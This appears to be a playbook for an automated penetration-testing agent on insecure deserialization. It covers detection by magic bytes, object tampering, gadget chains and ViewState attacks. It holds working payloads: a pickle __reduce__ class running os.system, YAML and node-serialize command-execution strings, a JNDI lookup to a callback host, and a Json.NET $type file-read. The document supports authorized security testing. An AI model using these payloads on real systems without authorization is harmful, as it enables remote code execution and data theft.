# Insecure Deserialization

## Scope and preconditions

Applies to any application that deserializes user-supplied data: session tokens,
API payloads, message queues, file uploads, or any parameter containing serialized
objects. Each language has its own serialization format and exploitation technique.

It does **not** cover: JSON parsing vulnerabilities without deserialization to
objects (use `api`), XML deserialization/XXE (use `xxe`), or template injection
(use `ssti`).

## Rules of engagement

- MUST use only benign proof-of-concept payloads (DNS callback, sleep, echo).
- NEVER execute destructive commands. Prove RCE with a sentinel, then stop.
- MUST identify the language and framework before generating payloads — wrong
  language payloads waste time and may cause crashes.
- MUST record the serialized payload and the evidence of execution.

## Workflow

- [ ] 1. Identify serialized data in transit
- [ ] 2. Determine the serialization format and language
- [ ] 3. Test modification without gadgets
- [ ] 4. Test language-specific gadget chains
- [ ] 5. Test ViewState attacks
- [ ] 6. Record findings

## Step 1: Identify serialized data

### Goal
Find parameters containing serialized objects.

### Detection by format

| Format | Magic bytes / Pattern | Language |
|---|---|---|
| Java binary | `AC ED 00 05` (hex) or `rO0AB` (base64) | Java |
| PHP serialized | `O:4:"User":2:{s:4:"name"` | PHP |
| Python pickle | `\x80\x04\x95` or `\x80\x03` | Python |
| .NET binary | `AAEAAAD/////` (base64) | .NET |
| Ruby Marshal | `\x04\x08` | Ruby |
| YAML with tags | `!!python/object` or `!ruby/object` | Python/Ruby |
| Node.js | `{"rce":"_$$ND_FUNC$$_..."}` | Node.js |
| Base64 blob in cookie | Decode and check for above patterns | Any |

Use `search_responses` to find:
- Cookies with long base64 or hex values
- Hidden form fields with serialized data (`__VIEWSTATE`, `javax.faces.ViewState`)
- Request/response bodies with serialized object patterns
- `Content-Type: application/x-java-serialized-object`

## Step 2: Determine format and language

### Goal
Know exactly which deserialization library and language to target.

### Actions
1. Decode the serialized data (base64, hex, URL decode as needed).
2. Match against the magic bytes table above.
3. Check response headers for language indicators: `X-Powered-By`,
   `Server`, error messages with stack traces.
4. For Java: look for class names in the serialized data.
5. For PHP: the format is human-readable (`O:classname:fields`).

## Step 3: Test modification without gadgets

### Goal
Determine if you can modify object properties to escalate privileges.

### Actions
This is the simplest deserialization attack — no gadget chain needed:
1. Decode the serialized object.
2. Modify a field (e.g., `role: "user"` → `role: "admin"`, `isAdmin: false` → `true`).
3. Re-encode and send.

For PHP:
```
O:4:"User":2:{s:4:"role";s:5:"admin";s:4:"name";s:4:"test";}
```
Change `s:4:"user"` to `s:5:"admin"` (update length prefix too).

For Java: more complex binary format — use a hex editor or tool.

## Step 4: Language-specific gadget chains

### Java (ysoserial)

**Gadget chains by library**:
| Library | Chain name | Effect |
|---|---|---|
| Commons Collections 1-7 | CommonsCollections1-7 | RCE |
| Spring | Spring1, Spring2 | RCE |
| Hibernate | Hibernate1, Hibernate2 | RCE |
| JDK 7u21 | Jdk7u21 | RCE |
| Groovy | Groovy1 | RCE |
| BeanShell | BeanShell1 | RCE |

**Detection**: Send the DNS callback payload for each chain. The one that
triggers a DNS lookup reveals which library is on the classpath.

**JNDI injection (Log4Shell-style)**:
If the application uses JNDI lookup:
```
${jndi:dns://COLLAB/test}
```
Inject in headers: `X-Forwarded-For`, `User-Agent`, `Referer`, `X-Api-Version`,
and in JSON body fields. If DNS callback received — JNDI injection confirmed.

### PHP

**Magic methods**: PHP calls `__wakeup()` on unserialize and `__destruct()` on
garbage collection. If a class has a dangerous `__destruct()` or `__toString()`
method, it is exploitable.

**POP chain construction**:
1. Find a sink: a magic method that calls a dangerous function
2. Trace backwards to find classes whose properties can control the call chain
3. Build the serialized object chain

**phar:// deserialization**:
Upload a polyglot phar file (valid JPEG that is also a phar archive):
```
file.jpg  (actually a phar with malicious metadata)
```
Then trigger inclusion via:
```
phar:///uploads/file.jpg
```
The `phar://` wrapper deserializes the metadata — no `unserialize()` call needed
in the application code.

### Python

**Pickle**:
```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(Exploit())
```
The `__reduce__` method defines what to execute on unpickling.

**YAML (PyYAML)**:
```yaml
!!python/object/apply:os.system ['id']
```
Exploitable when the application uses `yaml.load()` instead of `yaml.safe_load()`.

**Flask session cookies**:
If you know the `SECRET_KEY`:
1. Decode the Flask session cookie (it is a signed, not encrypted, pickle).
2. Forge a new session with a pickle RCE payload.
3. Sign it with the known `SECRET_KEY`.

Common `SECRET_KEY` locations: `.env` files, git history, default in framework
documentation, environment variables.

### Node.js

**node-serialize**:
```json
{"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```
The `_$$ND_FUNC$$_` marker triggers function execution during deserialization.

**cryo** library: prototype pollution via `__proto__` in serialized objects.

**js-yaml**: `!!js/function` tag for function execution (before js-yaml 4.0).

### Ruby

**Marshal.load**: exploitable with gadget chains from `Gem::Installer`,
`Gem::Requirement`, or ERB template objects.

**YAML**: `!ruby/object:Gem::Installer` for instantiation-based RCE.

### .NET

**ViewState** (see Step 5).

**BinaryFormatter**: exploitable with `TypeConfuseDelegate`, `PSObject`,
`TextFormattingRunProperties` gadgets.

**Json.NET** with `TypeNameHandling`: if `$type` is processed in JSON input,
attacker can instantiate arbitrary types.
```json
{"$type": "System.IO.FileInfo, mscorlib", "fileName": "../../web.config"}
```

## Step 5: ViewState attacks

### Goal
Exploit ASP.NET ViewState deserialization.

### Technique
ViewState is a serialized .NET object in a hidden form field:
```html
<input type="hidden" name="__VIEWSTATE" value="..." />
```

**Signed only (no encryption)**: Decode, modify, re-sign if you have the
machine key. Or use ysoserial.net with the known key.

**Unsigned**: Extremely rare in modern ASP.NET but if `enableViewStateMac="false"`,
inject arbitrary serialized objects directly.

**Finding the machine key**:
- `web.config` exposure (path traversal, backup files, git leak)
- `__VIEWSTATEGENERATOR` field value (helps identify the page)
- Azure/IIS default keys in some versions

### Java Server Faces (JSF)
`javax.faces.ViewState` — if using server-side state and the secret key is
known or default, deserialization payloads can achieve RCE.

## Step 6: Record the finding

Use `add_pentest_finding` with:
- The serialized data location (cookie, parameter, header)
- The format and language identified
- The gadget chain or technique used
- Evidence of execution (DNS callback, response content, timing)
- Impact: RCE, privilege escalation, or data modification

## Known false positives

- Base64 data in cookies that looks serialized but is actually encrypted — you
  cannot deserialize what you cannot decode.
- `__VIEWSTATE` that is encrypted with a machine-specific key — cannot be
  exploited without the key.
- Error messages from deserialization that indicate the class is not available —
  the gadget library is not on the classpath.
- Pickle data that is validated before unpickling (HMAC-signed) — cannot modify
  without the key.

## Reminder

Deserialization RCE requires three things: **user-controlled serialized data
reaches a deserializer**, **the right gadget library is on the classpath**, and
**the serialized data is not integrity-checked** (unsigned or key is known).
Start with property modification (no gadget needed) — changing `role: admin` is
simpler and often sufficient. Escalate to gadget chains only when needed.
